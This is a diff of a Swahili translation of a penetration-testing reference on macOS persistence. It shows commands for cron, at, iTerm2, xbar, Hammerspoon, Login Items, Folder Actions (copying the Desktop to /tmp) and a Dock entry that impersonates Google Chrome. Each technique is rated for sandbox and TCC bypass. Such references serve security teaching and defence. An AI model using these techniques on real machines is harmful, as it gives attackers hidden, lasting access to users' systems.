+- Hata hivyo, unahitaji kuwa na uwezo wa kutekeleza binary ya `crontab`
 - Au uwe root
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Mahali
 
 - **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-- Root inahitajika kwa ufikiaji wa moja kwa moja wa kuandika. Root haihitajiki ikiwa unaweza kutekeleza `crontab <file>`
+- Ruhusa za root zinahitajika ili kuandika moja kwa moja. Hakuna ruhusa za root zinazohitajika ikiwa unaweza kutekeleza `crontab <file>`
 - **Trigger**: Inategemea cron job
 
-#### Description & Exploitation
+#### Maelezo na Exploitation
 
-Orodhesha cron jobs za **mtumiaji wa sasa** kwa:
+Orodhesha cron jobs za **mtumiaji wa sasa** kwa kutumia:
 ```bash
 crontab -l
 ```
-Unaweza pia kuona cron jobs zote za users katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitajika root).
+Unaweza pia kuona cron jobs zote za watumiaji katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (needs root).
 
-Katika MacOS, folders kadhaa zinazoendesha scripts kwa **frequency fulani** zinaweza kupatikana katika:
+Katika MacOS, folda kadhaa zinazotekeleza scripts kwa **frequency fulani** zinaweza kupatikana katika:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
-Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (hutumiwa hasa kusafisha faili za muda). **periodic jobs** za kila siku zinaweza kutekelezwa kwa mfano kwa: `periodic daily`.<sup>[[10]](#references)</sup>
+Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (hutumika hasa kusafisha faili za muda). **periodic jobs** za kila siku zinaweza kutekelezwa kwa mfano kwa: `periodic daily`.<sup>[[10]](#references)</sup>
 
-Ili kuongeza **user cronjob programmatically**, inawezekana kutumia:
+Ili kuongeza **user cronjob programmatically** inawezekana kutumia:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -433,18 +433,18 @@ crontab /tmp/cron
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- iTerm2 ilikuwa na TCC permissions zilizotolewa
+- iTerm2 ilikuwa na ruhusa za TCC zilizotolewa
 
-#### Maeneo
+#### Mahali
 
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-- **Kichocheo**: Fungua iTerm
+- **Kichochezi**: Fungua iTerm
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-- **Kichocheo**: Fungua iTerm
+- **Kichochezi**: Fungua iTerm
 - **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-- **Kichocheo**: Fungua iTerm
+- **Kichochezi**: Fungua iTerm
 
 #### Maelezo na Exploitation
 
@@ -478,13 +478,13 @@ Script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia it
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-Mapendeleo ya iTerm2 yaliyo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza **kubainisha amri ya kutekelezwa** terminali ya iTerm2 inapofunguliwa.
+Mapendeleo ya iTerm2 yaliyopo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza **kuashiria amri ya kutekeleza** terminali ya iTerm2 inapofunguliwa.
 
 Mpangilio huu unaweza kusanidiwa katika mipangilio ya iTerm2:
 
 <figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
 
-Na amri hiyo huonekana katika mapendeleo:
+Na amri hiyo inaonyeshwa katika mapendeleo:
 ```bash
 plutil -p com.googlecode.iterm2.plist
 {
@@ -494,7 +494,7 @@ plutil -p com.googlecode.iterm2.plist
 [...]
 "Initial Text" => "touch /tmp/iterm-start-command"
 ```
-Unaweza kuweka amri itakayotekelezwa kwa:
+Unaweza kuweka amri ya kutekelezwa kwa:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist
@@ -506,25 +506,25 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
 ```
 > [!WARNING]
-> Kuna uwezekano mkubwa wa kuwepo **njia nyingine za kutumia vibaya iTerm2 preferences** kutekeleza arbitrary commands.
+> Kuna uwezekano mkubwa wa kuwepo **njia nyingine za kutumia vibaya iTerm2 preferences** ili kutekeleza amri kiholela.
 
 ### xbar
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>
+Andiko: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>
 
-- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini xbar lazima iwe imesakinishwa
+- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini xbar lazima iwe imewekwa
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Huomba Accessibility permissions
+- Inaomba Accessibility permissions
 
 #### Mahali
 
 - **`~/Library/Application\ Support/xbar/plugins/`**
-- **Kichochezi**: Mara tu xbar inapotekelezwa
+- **Trigger**: Mara tu xbar inapotekelezwa
 
 #### Maelezo
 
-Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imesakinishwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa xbar inapoanzishwa:<sup>[[12]](#references)</sup>
+Ikiwa program maarufu ya [**xbar**](https://github.com/matryer/xbar) imewekwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`**, ambayo itatekelezwa xbar inapoanzishwa:<sup>[[12]](#references)</sup>
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -537,20 +537,20 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>
 
 - Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini Hammerspoon lazima iwe imesakinishwa
+- Lakini Hammerspoon lazima iwe installed
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
 - Huomba ruhusa za Accessibility
 
 #### Mahali
 
 - **`~/.hammerspoon/init.lua`**
-- **Kichochezi**: Hammerspoon inapotekelezwa
+- **Kichochezi**: Mara hammerspoon inapotekelezwa
 
 #### Maelezo
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) hutumika kama jukwaa la automation kwa **macOS**, likitumia **lugha ya scripting ya LUA** kwa uendeshaji wake. Muhimu zaidi, linaunga mkono ujumuishaji wa code kamili ya AppleScript na utekelezaji wa shell scripts, hivyo kuimarisha kwa kiasi kikubwa uwezo wake wa scripting.<sup>[[13]](#references)</sup>
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) hutumika kama platform ya automation kwa **macOS**, ikitumia **LUA scripting language** katika utendaji wake. Muhimu zaidi, inaunga mkono ujumuishaji wa AppleScript code kamili na utekelezaji wa shell scripts, hivyo kuongeza kwa kiasi kikubwa uwezo wake wa scripting.<sup>[[13]](#references)</sup>
 
-Programu hutafuta faili moja, `~/.hammerspoon/init.lua`, na inapoanzishwa script hiyo itatekelezwa.
+App hutafuta faili moja, `~/.hammerspoon/init.lua`, na inapoanzishwa script hiyo itatekelezwa.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -559,38 +559,38 @@ EOF
 ```
 ### BetterTouchTool
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini BetterTouchTool lazima iwe imesakinishwa
+- Inafaa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini BetterTouchTool lazima iwe imewekwa
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Inaomba ruhusa za Automation-Shortcuts na Accessibility
+- Huomba ruhusa za Automation-Shortcuts na Accessibility
 
 #### Mahali
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
-Tool hii inaruhusu kubainisha applications au scripts za kutekelezwa wakati shortcuts fulani zinapobonyezwa. Mshambulizi anaweza kuweza kusanidi **shortcut na action yake ya kutekelezwa katika database** ili iweze kutekeleza arbitrary code (shortcut inaweza kuwa kubonyeza key moja tu).
+Tool hii inaruhusu kubainisha applications au scripts za kutekelezwa wakati shortcuts fulani zinapobonyezwa. Attacker anaweza kuwa na uwezo wa kusanidi **shortcut na action yake ya kutekelezwa kwenye database** ili kuendesha arbitrary code (shortcut inaweza kuwa kubonyeza tu key).
 
 ### Alfred
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini Alfred lazima iwe imesakinishwa
+- Inafaa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini Alfred lazima iwe imewekwa
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Inaomba ruhusa za Automation, Accessibility na hata Full-Disk access
+- Huomba ruhusa za Automation, Accessibility na hata Full-Disk access
 
 #### Mahali
 
 - `???`
 
-Inaruhusu kuunda workflows zinazoweza kutekeleza code masharti fulani yanapotimizwa. Kinadharia, mshambulizi anaweza kuunda workflow file na kuifanya Alfred ipakie file hiyo (inahitaji kulipia premium version ili kutumia workflows).
+Inaruhusu kuunda workflows zinazoweza kuendesha code wakati conditions fulani zinatimizwa. Kinachowezekana ni attacker kuunda workflow file na kuifanya Alfred iipakie (inahitaji kulipia premium version ili kutumia workflows).
 
 ### SSHRC
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Inafaa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Lakini ssh lazima iwe imewezeshwa na itumike
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- SSH hutumia kuwa na FDA access
+- SSH hutumika kuwa na FDA access
 
 #### Mahali
 
@@ -601,7 +601,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.g
 - **Trigger**: Kuingia kupitia ssh
 
 > [!CAUTION]
-> Kuwasha ssh kunahitaji Full Disk Access:
+> Ili kuwasha ssh kunahitaji Full Disk Access:
 >
 > ```bash
 > sudo systemsetup -setremotelogin on
@@ -609,29 +609,29 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.g
 
 #### Maelezo na Exploitation
 
-Kwa default, isipokuwa `PermitUserRC no` iwe katika `/etc/ssh/sshd_config`, mtumiaji **anapoingia kupitia SSH** scripts **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.<sup>[[14]](#references)</sup>
+Kwa default, isipokuwa kuwe na `PermitUserRC no` katika `/etc/ssh/sshd_config`, mtumiaji **anapoingia kupitia SSH**, scripts **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.<sup>[[14]](#references)</sup>
 
 ### **Login Items**
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini unahitaji kutekeleza `osascript` yenye args
+- Inafaa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini unahitaji kuendesha `osascript` ikiwa na args
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Maeneo
 
 - **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 - **Trigger:** Kuingia
-- Exploit payload huhifadhiwa ikiiita **`osascript`**
+- Exploit payload iliyohifadhiwa ikiita **`osascript`**
 - **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 - **Trigger:** Kuingia
 - Root inahitajika
 
 #### Maelezo
 
-Katika System Preferences -> Users & Groups -> **Login Items** unaweza kupata **items za kutekelezwa mtumiaji anapoingia**.\
-Inawezekana kuziorodhesha, kuziongeza na kuziondoa kutoka kwenye command line:<sup>[[15]](#references)</sup>
+Katika System Preferences -> Users & Groups -> **Login Items** unaweza kupata **items zitakazotekelezwa mtumiaji anapoingia**.\
+Inawezekana kuorodhesha, kuongeza na kuondoa items hizo kutoka command line:<sup>[[15]](#references)</sup>
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
@@ -642,35 +642,35 @@ osascript -e 'tell application "System Events" to make login item at end with pr
 #Remove an item:
 osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
-Vipengee hivi huhifadhiwa katika faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
+Vipengee hivi huhifadhiwa kwenye faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-**Login items** zinaweza pia kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
+**Login items** zinaweza pia kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), ambayo itahifadhi usanidi kwenye **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 
-### ZIP as Login Item
+### ZIP kama Login Item
 
 (Angalia sehemu iliyotangulia kuhusu Login Items; hii ni nyongeza)
 
-Ukihifadhi faili la **ZIP** kama **Login Item**, **`Archive Utility`** italifungua, na ikiwa zip hiyo ilikuwa, kwa mfano, imehifadhiwa katika **`~/Library`** na ilikuwa na Folder **`LaunchAgents/file.plist`** yenye backdoor, folder hiyo itaundwa (haipo kwa default) na plist itaongezwa. Kwa hiyo, wakati mwingine mtumiaji atakapoingia tena, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.
+Ukihifadhi faili la **ZIP** kama **Login Item**, **`Archive Utility`** italifungua. Ikiwa ZIP hiyo, kwa mfano, imehifadhiwa kwenye **`~/Library`** na ina Folder **`LaunchAgents/file.plist`** iliyo na backdoor, folder hiyo itaundwa (kwa chaguo-msingi haipo) na plist itaongezwa. Kwa hiyo, mtumiaji atakapoingia tena, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.
 
-Chaguo jingine lingekuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji, kwa hivyo ikiwa folder LaunchAgents tayari ipo, technique hii bado ingefanya kazi.
+Chaguo jingine ni kuunda mafaili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji. Hivyo, hata kama folder LaunchAgents tayari ipo, technique hii bado itafanya kazi.
 
 ### At
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>
+Andiko: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>
 
-- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**
+- Ni muhimu kwa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **imewezeshwa**
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Mahali
 
-- Unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**
+- Unahitaji **kutekeleza** **`at`** na lazima iwe **imewezeshwa**
 
-#### **Description**
+#### **Maelezo**
 
-Tasks za `at` zimeundwa kwa ajili ya **kupanga tasks za mara moja** zitakazotekelezwa wakati maalum. Tofauti na cron jobs, tasks za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba tasks hizi hudumu hata baada ya system reboot, jambo linalozifanya kuwa matatizo ya usalama yanayoweza kutokea chini ya hali fulani.<sup>[[16]](#references)</sup>
+Kazi za `at` zimeundwa kwa ajili ya **kupanga kazi za mara moja** zitakazotekelezwa wakati maalum. Tofauti na cron jobs, kazi za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba kazi hizi hubaki baada ya mfumo kuwashwa upya, jambo linalozifanya kuwa hatari za kiusalama katika hali fulani.<sup>[[16]](#references)</sup>
 
-Kwa **default**, huwa **disabled**, lakini mtumiaji wa **root** anaweza **kuziwezesha** kwa:
+Kwa **chaguo-msingi**, huwa **zimezimwa**, lakini mtumiaji wa **root** anaweza **kuzikiwezesha** kwa:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
@@ -678,7 +678,7 @@ Hii itaunda faili baada ya saa 1:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-Kagua foleni ya kazi kwa kutumia `atq:`
+Angalia foleni ya kazi ukitumia `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
@@ -718,7 +718,7 @@ echo 11 > /tmp/at.txt
 > [!WARNING]
 > Ikiwa AT tasks hazijawezeshwa, tasks zilizoundwa hazitatekelezwa.
 
-**Mafaili ya kazi** yanaweza kupatikana katika `/private/var/at/jobs/`
+**job files** zinaweza kupatikana kwenye `/private/var/at/jobs/`
 ```
 sh-3.2# ls -l /private/var/at/jobs/
 total 32
@@ -727,42 +727,42 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
-Jina la faili lina queue, nambari ya job, na muda uliopangwa wa kuendeshwa. Kwa mfano, tuchunguze `a0001a019bdcd2`.
+Jina la faili lina queue, nambari ya job, na muda uliopangwa wa kuendeshwa. Kwa mfano, tuangalie `a0001a019bdcd2`.
 
-- `a` - hii ndiyo queue
+- `a` - hii ni queue
 - `0001a` - nambari ya job katika hex, `0x1a = 26`
-- `019bdcd2` - muda katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.
+- `019bdcd2` - muda katika hex. Unawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika desimali. Tukiizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.
 
 Tukichapisha faili ya job, tunapata kwamba ina taarifa zilezile tulizopata kwa kutumia `at -c`.
 
 ### Folder Actions
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
-Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>
+Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
+Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini unahitaji kuweza kuita `osascript` ikiwa na arguments ili kuwasiliana na **`System Events`** na kuweza kusanidi Folder Actions
+- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini unahitaji kuwa na uwezo wa kuita `osascript` ikiwa na arguments ili kuwasiliana na **`System Events`** na kuweza kusanidi Folder Actions
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Ina baadhi ya ruhusa za msingi za TCC kama Desktop, Documents na Downloads
 
-#### Location
+#### Mahali
 
 - **`/Library/Scripts/Folder Action Scripts`**
-- Root inahitajika
+- Root required
 - **Trigger**: Ufikiaji wa folder iliyobainishwa
 - **`~/Library/Scripts/Folder Action Scripts`**
 - **Trigger**: Ufikiaji wa folder iliyobainishwa
 
-#### Description & Exploitation
+#### Maelezo na Exploitation
 
-Folder Actions ni scripts zinazoanzishwa kiotomatiki na mabadiliko katika folder, kama vile kuongeza au kuondoa items, au actions nyingine kama kufungua au kubadilisha ukubwa wa dirisha la folder. Actions hizi zinaweza kutumika kwa tasks mbalimbali, na zinaweza kuanzishwa kwa njia tofauti, kama kutumia Finder UI au terminal commands.<sup>[[17]](#references)[[18]](#references)</sup>
+Folder Actions ni scripts zinazoanzishwa kiotomatiki na mabadiliko katika folder, kama vile kuongeza au kuondoa items, au actions nyingine kama kufungua au kubadilisha ukubwa wa dirisha la folder. Actions hizi zinaweza kutumika kwa tasks mbalimbali, na zinaweza kuanzishwa kwa njia tofauti kama kutumia Finder UI au terminal commands.<sup>[[17]](#references)[[18]](#references)</sup>
 
-Ili kusanidi Folder Actions, una chaguo kama:
+Ili kusanidi Folder Actions, una options kama:
 
-1. Kuunda workflow ya Folder Action kwa kutumia [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama service.
+1. Kutengeneza workflow ya Folder Action kwa [Automator](https://support.apple.com/guide/automator/welcome/mac) na kui-install kama service.
 2. Kuambatisha script manually kupitia Folder Actions Setup katika context menu ya folder.
 3. Kutumia OSAScript kutuma Apple Event messages kwa `System Events.app` ili kusanidi Folder Action programmatically.
-- Njia hii ni muhimu hasa kwa kuingiza action kwenye mfumo, na kutoa kiwango fulani cha persistence.
+- Method hii ni muhimu hasa kwa ku-embed action ndani ya mfumo, na kutoa kiwango fulani cha persistence.
 
 Script ifuatayo ni mfano wa kinachoweza kutekelezwa na Folder Action:
 ```applescript
@@ -778,7 +778,7 @@ Ili kufanya script iliyo hapo juu itumike na Folder Actions, i-compile kwa kutum
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Baada ya script kukusanywa, sanidi Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kimataifa na kuambatisha script iliyokusanywa hapo awali kwenye folda ya Desktop.
+Baada ya script kukompiliwa, sanidi Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kimataifa na kuambatisha mahsusi script iliyokompiliwa awali kwenye folda ya Desktop.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events")
@@ -788,11 +788,11 @@ var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
 se.folderActions.push(fa)
 fa.scripts.push(myScript)
 ```
-Endesha script ya setup kwa:
+Endesha setup script kwa:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
-- Hii ndiyo njia ya kutekeleza persistence hii kupitia GUI:
+- Hivi ndivyo unavyotekeleza persistence hii kupitia GUI:
 
 Hii ndiyo script itakayotekelezwa:
 ```applescript:source.js
@@ -805,53 +805,53 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
 Icompile kwa kutumia: `osacompile -l JavaScript -o folder.scpt source.js`
 
-Ihamishe hadi:
+Isogeze hadi:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-Kisha, fungua app ya `Folder Actions Setup`, chagua **folda unayotaka kuifuatilia** na katika hali yako chagua **`folder.scpt`** (kwangu niliiita output2.scp):
+Kisha, fungua app ya `Folder Actions Setup`, chagua **folder unayotaka kufuatilia** na uchague katika hali yako **`folder.scpt`** (katika hali yangu niliiita output2.scp):
 
 <figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
 
-Sasa, ukifungua folda hiyo kwa kutumia **Finder**, script yako itatekelezwa.
+Sasa, ukifungua folder hiyo kwa **Finder**, script yako itatekelezwa.
 
-Configuration hii ilihifadhiwa katika **plist** iliyoko **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika umbizo la base64.
+Configuration hii ilihifadhiwa kwenye **plist** iliyoko **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika muundo wa base64.
 
-Sasa, tujaribu kuandaa persistence hii bila ufikiaji wa GUI:
+Sasa, tujaribu kuandaa persistence hii bila GUI access:
 
-1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuihifadhi kama backup:
+1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuihifadhi kama backup:
 - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
-2. **Ondoa** Folder Actions ulizoweka hivi punde:
+2. **Ondoa** Folder Actions uliyoweka hivi punde:
 
 <figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>
 
-Sasa kwa kuwa tuna mazingira tupu
+Sasa kwa kuwa tuna environment tupu
 
-3. Copy faili ya backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
-4. Fungua Folder Actions Setup.app ili ipakie configuration hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
+3. Nakili backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
+4. Fungua Folder Actions Setup.app ili kutumia config hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
 
 > [!CAUTION]
 > Na hii haikunifanyia kazi, lakini hayo ndiyo maelekezo kutoka kwenye writeup:(
 
-### Shortcuts za Dock
+### Njia za mkato za Dock
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>
 
-- Ni muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Lakini unahitaji kuwa umesakinisha application hasidi ndani ya mfumo
+- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Lakini unahitaji kuwa umeinstall malicious application ndani ya system
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Mahali
+#### Eneo
 
 - `~/Library/Preferences/com.apple.dock.plist`
-- **Trigger**: Mtumiaji anapobofya app iliyo ndani ya Dock
+- **Trigger**: Mtumiaji anapobofya app iliyo ndani ya dock
 
 #### Maelezo na Exploitation
 
 Applications zote zinazoonekana kwenye Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>
 
-Inawezekana **kuongeza application** kwa kutumia tu:
+Inawezekana **kuongeza application** kwa kutumia:
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -859,7 +859,7 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 # Restart Dock
 killall Dock
 ```
-Kwa kutumia **social engineering** unaweza **impersonate kwa mfano Google Chrome** ndani ya dock na kutekeleza script yako mwenyewe:
+Kwa kutumia **social engineering**, unaweza **kujifanya kuwa, kwa mfano, Google Chrome** ndani ya dock na kwa kweli kutekeleza script yako mwenyewe:
 ```bash
 #!/bin/sh
 
@@ -912,12 +912,12 @@ cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chr
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 killall Dock
 ```
-### Color Pickers
+### Vichaguaji vya Rangi
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>
 
-- Muhimu kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Kitendo maalum sana kinahitaji kutokea
+- Inafaa kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Kitendo maalum sana kinahitaji kufanyika
 - Utaishia kwenye sandbox nyingine
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
@@ -925,15 +925,15 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.gi
 
 - `/Library/ColorPickers`
 - Root inahitajika
-- Trigger: Tumia color picker
+- Trigger: Tumia kichaguaji cha rangi
 - `~/Library/ColorPickers`
-- Trigger: Tumia color picker
+- Trigger: Tumia kichaguaji cha rangi
 
 #### Maelezo na Exploit
 
